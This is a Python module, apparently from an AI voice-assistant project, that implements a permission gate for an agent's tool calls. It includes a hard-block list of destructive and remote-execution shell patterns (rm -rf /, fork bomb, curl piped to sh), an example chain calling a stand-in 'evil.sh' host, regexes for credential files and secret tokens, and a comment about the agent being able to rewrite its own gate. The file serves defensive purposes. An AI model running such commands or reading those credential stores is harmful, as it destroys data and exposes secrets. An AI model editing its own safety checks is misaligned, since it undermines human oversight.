"""The safety gate.

This is the part most tutorials get wrong. Passing a blanket
`--allowedTools Read,Write,Edit,Bash` hands an LLM unrestricted shell on your
machine so the voice loop won't deadlock on a prompt. That trades a UX problem
for a security one.

Instead: classify every tool call. Read-only tools run free. Writes are confined
to the workspace. Shell commands are matched against an allowlist of program
names, with a hard block on the handful of things that are unrecoverable. Anything
unclassified escalates to the user rather than defaulting open.
"""

from __future__ import annotations

import datetime as _dt
import json as _json
import os
import re
import shlex
from collections.abc import Awaitable, Callable
from pathlib import Path

try:  # these moved between SDK releases; accept either location
    from claude_agent_sdk import PermissionResultAllow, PermissionResultDeny
except ImportError:  # pragma: no cover
    from claude_agent_sdk.types import PermissionResultAllow, PermissionResultDeny

from .config import AUDIT_LOG, ROOT, VAULT, VAULT_INBOX, VAULT_WRITABLE, WORKSPACE
from .sandbox import SANDBOX_TOOL, detect_backend

# Tools with no side effects — always fine.
READ_ONLY_TOOLS = {
    "WebFetch", "WebSearch", "TodoWrite", "Task", "mcp__memory__recall",
}

# Read-only, but reading the *wrong* file is half of an exfiltration chain:
# read a credential, then send it out via WebFetch or an allowlisted `curl`.
# So these get path-checked rather than waved through.
FILE_READ_TOOLS = {"Read", "Glob", "Grep", "NotebookRead"}

# Substrings that mark a path as a credential store or private-data blob.
SENSITIVE_READ_MARKERS = [
    r"[\\/]\.ssh[\\/]", r"[\\/]\.aws[\\/]", r"[\\/]\.gnupg[\\/]",
    r"[\\/]\.config[\\/]gcloud[\\/]", r"[\\/]\.kube[\\/]",
    r"[\\/]\.docker[\\/]config\.json", r"[\\/]\.netrc",
    r"[\\/]\.git-credentials", r"[\\/]\.npmrc", r"[\\/]\.pypirc",
    r"id_rsa", r"id_ed25519", r"\.pem$", r"\.pfx$", r"\.kdbx$",
    r"[\\/]\.env(\.|\s|$)",
    # Browser profiles hold session cookies — equivalent to logged-in access.
    r"User Data[\\/].*(Login Data|Cookies|Web Data)",
    r"AppData[\\/]Roaming[\\/]Mozilla[\\/]Firefox[\\/]Profiles",
    r"AppData[\\/]Local[\\/](Google|Microsoft|BraveSoftware)[\\/].*User Data",
    r"System32[\\/]config[\\/](SAM|SECURITY|SYSTEM)",
    r"NTUSER\.DAT",
    r"[\\/]Library[\\/]Keychains[\\/]",
]

# Interpreters are on the allowlist because real work needs them, but an inline
# `-c "..."` payload is arbitrary code execution and defeats the point of having
# an allowlist at all. Running a *file* is fine; running a string is escalated.
INLINE_CODE_FLAGS = re.compile(
    r"(^|\s)(-c|-e|--eval|-Command|-EncodedCommand|-enc)(\s|$|:)", re.IGNORECASE
)
INTERPRETERS = {
    "python", "python3", "py", "node", "powershell", "pwsh", "perl", "ruby",
    "deno", "bun", "irb", "php",
}

# Tools that change state but are cheap to undo.
WRITE_TOOLS = {"Write", "Edit", "MultiEdit", "NotebookEdit"}

# Reading a huge file whole is not a security problem, it is a money problem:
# a 40MB log becomes tens of thousands of tokens that are then resent on every
# subsequent turn of a persistent session. Grep first, then Read the lines that
# matter. A Read that already carries offset/limit is doing exactly that, so it
# passes at any size.
LARGE_FILE_BYTES = int(os.getenv("FROST_LARGE_FILE_BYTES", str(2 * 1024 * 1024)))

# Values that must never be written into long-term memory. Memory is injected
# into the system prompt of every future session, so a secret recorded once is a
# secret resent forever — to the model, into the prompt cache, and into a file
# that is not encrypted. FROST.md already says "name where it lives, not what it
# is"; this is that rule as code, because a prompt rule is not a control.
SECRET_VALUE_MARKERS = [
    r"sk-ant-[A-Za-z0-9_\-]{20,}",
    r"\bgsk_[A-Za-z0-9]{30,}",
    r"\bGOCSPX-[A-Za-z0-9_\-]{20,}",
    r"\bAIza[0-9A-Za-z_\-]{30,}",
    r"\b(?:ghp|gho|ghs|ghu)_[A-Za-z0-9]{30,}",
    r"\bgithub_pat_[A-Za-z0-9_]{30,}",
    r"\bAKIA[0-9A-Z]{16}\b",
    r"\bxox[baprs]-[A-Za-z0-9\-]{10,}",
    r"-----BEGIN [A-Z ]*PRIVATE KEY-----",
    r"\beyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{10,}\.",          # JWT
    # Scoped `(?i:...)`, not a bare `(?i)`: a global flag is only legal at the
    # very start of a pattern, and these are joined into one alternation.
    r"(?i:\b(?:api[_\- ]?key|secret|token|passwd|password)\b)\s*[:=]\s*"
    r"[\"']?[A-Za-z0-9_\-]{16,}",
    r"\b(?:\d[ \-]?){15,18}\b",                                   # card-shaped
]
_SECRET_RE = re.compile("|".join(SECRET_VALUE_MARKERS))


def looks_like_secret(text: str) -> bool:
    """True if the text contains something shaped like a live credential.

    Deliberately matches on the *shape of the value*, not on nearby words: an
    assistant that only redacts when it sees the word "password" redacts nothing
    useful. False positives are acceptable here — the cost is one refused memory
    with an explanation, and the alternative is a key living in the system prompt
    of every future session.
    """
    return bool(text) and bool(_SECRET_RE.search(text))

# Shell programs safe to run unattended.
SAFE_COMMANDS = {
    "ls", "dir", "cat", "type", "echo", "pwd", "cd", "whoami", "hostname",
    "date", "time", "find", "findstr", "grep", "head", "tail", "wc", "sort",
    "git", "python", "python3", "py", "pip", "pytest", "uv", "node", "npm",
    "npx", "where", "which", "more", "du", "df",
    "curl", "ping", "tree", "systeminfo", "tasklist", "code", "explorer",
    "start", "powershell", "pwsh",
}

# Substrings that are never auto-approved, whatever the program.
#
# These are matched against the RAW command text, deliberately without the
# quote-aware parsing used for the allowlist. Quoting is how an attacker hides
# intent (`sh -c "rm -rf /"`), so this layer refuses to be clever about it. The
# cost is the occasional false positive — `echo "rm -rf /"` is harmless and gets
# denied anyway. That trade is correct: a blocked harmless echo is an
# inconvenience, a missed `rm -rf /` is not.
HARD_BLOCK = [
    r"\brm\s+-rf\s+/",
    r"\bformat\s+[a-z]:",
    r"\bdel\s+/[sf]\b",
    r"Remove-Item[^|]*-Recurse[^|]*-Force[^|]*[\\/](Windows|Users)\b",
    r"\bmkfs\b",
    r"\bdd\s+if=",
    r":\s*\(\)\s*\{.*\|.*&\s*\}\s*;",   # fork bomb
    r"\bshutdown\b",
    r"\breg\s+delete\b",
    r"\bnet\s+user\b.*\/add",
    r"\bcurl\b[^|]*\|\s*(bash|sh|powershell)",   # curl | sh
    r"\biwr\b[^|]*\|\s*iex",                     # PowerShell equivalent
]

# Verbs that only observe. Anything not here is treated as capable of change.
MCP_READ_VERBS = (
    "list", "get", "read", "search", "find", "fetch", "query", "view",
    "describe", "check", "lookup", "count", "freebusy", "available",
)
# Never auto-approved through a third-party tool, whatever the wording.
MCP_DESTRUCTIVE = ("delete", "remove", "send", "trash", "purge", "revoke", "cancel")

PermissionCallback = Callable[..., Awaitable[object]]


# --- FROST's own source is not FROST's to edit -------------------------------
# Found by testing rather than by reading, which is the only way these get
# found. The write rule was "anywhere under WORKSPACE or ROOT", and ROOT is the
# repository — so `Write` to `frost/permissions.py` was auto-approved. The gate
# could rewrite the gate.
#
# It was never exploitable inside a running turn (the module is already
# imported), which is exactly what makes it the dangerous kind of hole: nothing
# would have looked wrong until the next launch. The worst path was not even the
# gate itself but `mcp.json` and `.git/hooks/` — both are arbitrary code that
# runs outside the sandbox on next start.
#
# These do not become unwritable, they become *deliberate*: the write escalates
# to a human instead of being waved through. Editing FROST's code should cost a
# confirmation. That is the whole cost, and it is paid rarely.
PROTECTED_DIRS = {"frost", "tests", ".git", ".claude", "memory"}
PROTECTED_FILES = {
    ".env", ".env.example", "mcp.json", "FROST.md", "requirements.txt",
    ".gitignore",
}


def _is_protected(path_str: str) -> str:
    """Return a description if the path is part of FROST's own machinery."""
    if not path_str:
        return ""
    try:
        target = Path(path_str).expanduser().resolve()
    except (OSError, ValueError):
        return ""
    # The workspace is normally *inside* ROOT and is meant to be written to, so
    # it wins over every rule below.
    try:
        target.relative_to(WORKSPACE.resolve())
        return ""
    except ValueError:
        pass
    try:
        rel = target.relative_to(ROOT.resolve())
    except ValueError:
        return ""
    if rel.parts and rel.parts[0] in PROTECTED_DIRS:
        return f"its own {rel.parts[0]}/ directory"
    if rel.name in PROTECTED_FILES:
        return f"its own {rel.name}"
    return ""


def _within(path_str: str, roots: tuple[Path, ...]) -> bool:
    if not path_str:
        return False
    try:
        target = Path(path_str).expanduser().resolve()
    except (OSError, ValueError):
        return False
    for root in roots:
        try:
            target.relative_to(root.resolve())
            return True
        except ValueError:
            continue
    return False


_SENSITIVE_RE = re.compile("|".join(SENSITIVE_READ_MARKERS), re.IGNORECASE)


def _is_sensitive(text: str) -> bool:
    """True if the text names a credential store or private-data blob.

    The patterns accept either path separator, so no normalisation is needed —
    but they do anchor on end-of-token, so the caller must not hand us a string
    with trailing padding.
    """
    return bool(text) and bool(_SENSITIVE_RE.search(text.strip()))


def _audit(tool_name: str, input_data: dict, decision):
    """Append-only record of every gate decision.

    Written outside the workspace so the Write tool cannot reach it. Failures
    here are swallowed on purpose: a broken log must not take the assistant
    down, but it also must not silently look like a clean run, so we print.
    """
    verdict = type(decision).__name__.replace("PermissionResult", "").upper()
    try:
        AUDIT_LOG.parent.mkdir(parents=True, exist_ok=True)
        entry = {
            "ts": _dt.datetime.now(_dt.timezone.utc).isoformat(timespec="seconds"),
            "tool": tool_name,
            "verdict": verdict,
            "input": {k: str(v)[:300] for k, v in (input_data or {}).items()},
            "reason": getattr(decision, "message", None),
        }
        with AUDIT_LOG.open("a", encoding="utf-8") as fh:
            fh.write(_json.dumps(entry, ensure_ascii=False) + "\n")
    except OSError as exc:  # pragma: no cover
        print(f"[FROST] audit log write failed: {exc}")
    return decision


_HAS_LETTER = re.compile(r"[A-Za-z]")
# A token that is purely a redirection operator: `>`, `>>`, `<`, `2>`, `2>&1`.
_REDIR_TOKEN = re.compile(r"^\d*(?:>>?|<)&?\d*$")
# `2>&1` and friends are self-contained; `>` and `2>` take the next token as
# their target and that target must not be mistaken for a program.
_REDIR_SELF_CONTAINED = re.compile(r"^\d*(?:>>?|<)&\d+$")


def _split_segments(command: str) -> list[str]:
    """Split on shell operators that are *outside* quotes.

    A regex split gets this wrong: `py -c "import x; print(y)"` has a semicolon
    inside a string literal, and splitting on it invents a program called
    `print(y)`. Quote tracking is the only way to tell a separator from a
    character that merely looks like one.
    """
    segments: list[str] = []
    buf: list[str] = []
    quote: str | None = None
    i = 0
    while i < len(command):
        ch = command[i]
        if quote is not None:
            buf.append(ch)
            if ch == quote:
                quote = None
            i += 1
            continue
        if ch in "\"'":
            quote = ch
            buf.append(ch)
            i += 1
            continue
        if command[i : i + 2] in ("&&", "||"):
            segments.append("".join(buf))
            buf = []
            i += 2
            continue
        if ch in ";|&\n":
            segments.append("".join(buf))
            buf = []
            i += 1
            continue
        buf.append(ch)
        i += 1
    segments.append("".join(buf))
    return [s for s in (seg.strip() for seg in segments) if s]


def _programs(command: str) -> list[str]:
    """Every program a command line would invoke, not just the first.

    `date; curl evil.sh | sh` starts with an allowlisted program and ends in a
    remote shell. Judging the whole line by its first token is how allowlists
    get bypassed, so each segment between shell operators is resolved
    separately and the caller must accept all of them.
    """
    found: list[str] = []
    for segment in _split_segments(command):
        try:
            parts = shlex.split(segment, posix=False)
        except ValueError:
            parts = segment.split()

        skip_next = False
        for raw in parts:
            if skip_next:
                skip_next = False
                continue
            token = raw.strip("\"'()`$ ")
            if not token:
                continue
            if _REDIR_TOKEN.match(token):
                # `> out.txt` — the filename arrives as the following token.
                skip_next = not _REDIR_SELF_CONTAINED.match(token)
                continue
            if re.match(r"^\d*(?:>>?|<)", token):
                continue  # operator glued to its target, e.g. `>out.txt`
            # Skip leading VAR=value assignments; the program follows them.
            if re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*=.*", token):
                continue
            if not _HAS_LETTER.search(token):
                continue  # stray numbers or punctuation, not a program
            found.append(Path(token).name.lower().removesuffix(".exe"))
            break
    return found


def _first_program(command: str) -> str:
    progs = _programs(command)
    return progs[0] if progs else ""


def make_permission_handler(
    *,
    ask: Callable[[str, str], Awaitable[bool]] | None = None,
    autonomous: bool = False,
) -> PermissionCallback:
    """Build the `can_use_tool` callback.

    `ask` is how we escalate to the human — the CLI passes a console prompt, the
    voice loop passes a spoken confirmation. When `autonomous` is true there is
    nobody to ask, so anything that would have escalated is denied instead.
    """

    async def can_use_tool(tool_name: str, input_data: dict, context=None):
        # The vault joins the writable set only when explicitly opted in. Notes
        # are the one thing on this machine that cannot be regenerated, so the
        # default is that FROST can read them and not touch them.
        writable_roots = [WORKSPACE, ROOT]
        if VAULT_INBOX is not None:
            writable_roots.append(VAULT_INBOX)
        if VAULT and VAULT_WRITABLE:
            writable_roots.append(Path(VAULT))
        writable_roots = tuple(writable_roots)

        if tool_name in READ_ONLY_TOOLS:
            return _audit(tool_name, input_data, PermissionResultAllow(updated_input=input_data))

        if tool_name in FILE_READ_TOOLS:
            target = " ".join(
                part
                for k in ("file_path", "notebook_path", "path", "pattern", "glob")
                if (part := str(input_data.get(k, "") or "").strip())
            )
            if _is_sensitive(target):
                return _audit(
                    tool_name,
                    input_data,
                    await _escalate(
                        tool_name,
                        f"read a credential or private-data file: {target.strip()}",
                        input_data,
                        ask,
                        autonomous,
                    ),
                )
            # Whole-file reads of very large files are refused with directions
            # rather than escalated: "approve reading a 40MB log?" is a question
            # with no good answer, and grepping first is strictly better.
            if tool_name == "Read" and not any(
                input_data.get(k) for k in ("offset", "limit")
            ):
                path = str(input_data.get("file_path", "") or "")
                try:
                    size = Path(path).stat().st_size if path else 0
                except OSError:
                    size = 0
                if size > LARGE_FILE_BYTES:
                    return _audit(
                        tool_name,
                        input_data,
                        PermissionResultDeny(
                            message=(
                                f"Blocked: {Path(path).name} is {size // 1024 // 1024}MB. "
                                "Reading it whole would fill the context and be resent "
                                "on every later turn. Use Grep to find the relevant "
                                "lines, then Read with `offset` and `limit`."
                            )
                        ),
                    )
            return _audit(tool_name, input_data, PermissionResultAllow(updated_input=input_data))

        if tool_name in WRITE_TOOLS:
            path = input_data.get("file_path") or input_data.get("notebook_path") or ""
            if protected := _is_protected(path):
                return _audit(
                    tool_name,
                    input_data,
                    await _escalate(
                        tool_name,
                        f"modify {protected} — FROST's own code or configuration "
                        f"({Path(path).name})",
                        input_data,
                        ask,
                        autonomous,
                    ),
                )
            if _within(path, writable_roots):
                return _audit(
                    tool_name, input_data, PermissionResultAllow(updated_input=input_data)
                )
            return _audit(
                tool_name,
                input_data,
                await _escalate(
                    tool_name,
                    f"write outside the workspace: {path}",
                    input_data,
                    ask,
                    autonomous,
                ),
            )

        # The sandboxed shell and the raw host shell get the same content
        # checks, but differ in what an *allowed* call can reach. Raw Bash runs
        # on the host with your environment; the sandbox does not. So the
        # sandbox is the default path and raw Bash always costs a confirmation.
        # `PowerShell` is a separate tool from `Bash` on Windows. Without it
        # here, PowerShell commands skipped the destructive-pattern and
        # allowlist checks entirely and fell through to "unclassified" — safe,
        # because unclassified escalates, but it meant `rm -rf` style content
        # was never actually inspected on the shell people use most.
        if tool_name in {"Bash", "PowerShell", SANDBOX_TOOL}:
            sandboxed = tool_name == SANDBOX_TOOL
            command = input_data.get("command", "")
            for pattern in HARD_BLOCK:
                if re.search(pattern, command, re.IGNORECASE):
                    return _audit(
                        tool_name,
                        input_data,
                        PermissionResultDeny(
                            message=(
                                "Blocked: that command matches a destructive pattern "
                                "FROST will never run. Ask the user to run it manually."
                            )
                        ),
                    )
            if _is_sensitive(command):
                return _audit(
                    tool_name,
                    input_data,
                    await _escalate(
                        tool_name,
                        f"touch a credential store via shell: `{command}`",
                        input_data,
                        ask,
                        autonomous,
                    ),
                )
            program = _first_program(command)
            isolated = sandboxed and detect_backend() == "docker"

            if isolated:
                # Throwaway container: no host mounts beyond the workspace, no
                # network, no credentials in the environment. The blast radius
                # is a directory FROST may already write to, so an allowlist
                # here would buy nothing and cost capability.
                return _audit(
                    tool_name, input_data, PermissionResultAllow(updated_input=input_data)
                )

            if program in INTERPRETERS and INLINE_CODE_FLAGS.search(command):
                # `python -c "..."` is arbitrary execution wearing an allowlisted name.
                return _audit(
                    tool_name,
                    input_data,
                    await _escalate(
                        tool_name,
                        f"run inline code through {program}: `{command}`",
                        input_data,
                        ask,
                        autonomous,
                    ),
                )

            if not sandboxed:
                # Raw host shell with your real environment. The sandbox sits
                # right next to it and costs nothing, so make the host path the
                # one you have to consciously choose.
                return _audit(
                    tool_name,
                    input_data,
                    await _escalate(
                        tool_name,
                        f"run `{command}` on the host, outside the sandbox",
                        input_data,
                        ask,
                        autonomous,
                    ),
                )

            programs = _programs(command)
            unlisted = [p for p in programs if p not in SAFE_COMMANDS]
            if programs and not unlisted:
                return _audit(
                    tool_name, input_data, PermissionResultAllow(updated_input=input_data)
                )
            reason = (
                f"run `{command}`"
                if not unlisted
                else f"run `{command}` (not on the allowlist: {', '.join(unlisted)})"
            )
            return _audit(
                tool_name,
                input_data,
                await _escalate(tool_name, reason, input_data, ask, autonomous),
            )

        # --- screen capture --------------------------------------------------
        # A screenshot is read-only, but it is the widest read on the machine:
        # it can contain a password manager, a bank page, or someone else's
        # messages, and whatever text it contains becomes model input. The
        # module refuses credential-looking windows on its own. The rule the
        # gate adds is consent: a screenshot is only ever taken while a human is
        # sitting there to see the capture notice and object to it. In
        # autonomous mode there is nobody to object, so there is no capture.
        if tool_name.startswith("mcp__vision__"):
            if autonomous:
                return _audit(
                    tool_name,
                    input_data,
                    PermissionResultDeny(
                        message=(
                            "Blocked: screen capture requires someone present to "
                            "consent. FROST does not photograph an unattended screen."
                        )
                    ),
                )
            return _audit(
                tool_name, input_data, PermissionResultAllow(updated_input=input_data)
            )

        # --- third-party MCP tools ------------------------------------------
        # Classify by the verb in the tool name. An MCP server is unreviewed
        # code holding real credentials, so reads run freely while anything
        # that could change or send something escalates to a human — even if
        # the server advertises itself as read-only.
        if tool_name.startswith("mcp__") and not tool_name.startswith(
            ("mcp__memory__", "mcp__shell__", "mcp__vision__")
        ):
            verb = tool_name.split("__")[-1].lower()
            if any(k in verb for k in MCP_DESTRUCTIVE):
                return _audit(
                    tool_name,
                    input_data,
                    PermissionResultDeny(
                        message=(
                            "Blocked: FROST does not delete or send through "
                            "third-party tools. Do it yourself, or ask for a draft."
                        )
                    ),
                )
            if any(k in verb for k in MCP_READ_VERBS):
                return _audit(
                    tool_name, input_data, PermissionResultAllow(updated_input=input_data)
                )
            return _audit(
                tool_name,
                input_data,
                await _escalate(
                    tool_name,
                    f"use {tool_name.replace('mcp__', '').replace('__', ' · ')}, "
                    "which may change data",
                    input_data,
                    ask,
                    autonomous,
                ),
            )

        if tool_name.startswith("mcp__memory__"):
            # `remember` is cheap and reversible; `forget` deletes, so confirm it.
            if tool_name == "mcp__memory__forget":
                return _audit(
                    tool_name,
                    input_data,
                    await _escalate(
                        tool_name,
                        f"delete memory '{input_data.get('slug', '?')}'",
                        input_data,
                        ask,
                        autonomous,
                    ),
                )
            return _audit(
                tool_name, input_data, PermissionResultAllow(updated_input=input_data)
            )

        return _audit(
            tool_name,
            input_data,
            await _escalate(tool_name, "use an unclassified tool", input_data, ask, autonomous),
        )

    return can_use_tool


async def _escalate(
    tool_name: str,
    description: str,
    input_data: dict,
    ask: Callable[[str, str], Awaitable[bool]] | None,
    autonomous: bool,
):
    if autonomous or ask is None:
        return PermissionResultDeny(
            message=(
                f"Denied: needs approval to {description}, and no one is available "
                "to approve. Report this to the user instead of retrying."
            )
        )
    approved = await ask(tool_name, description)
    if approved:
        return PermissionResultAllow(updated_input=input_data)
    return PermissionResultDeny(message="The user declined. Do not retry; find another way.")
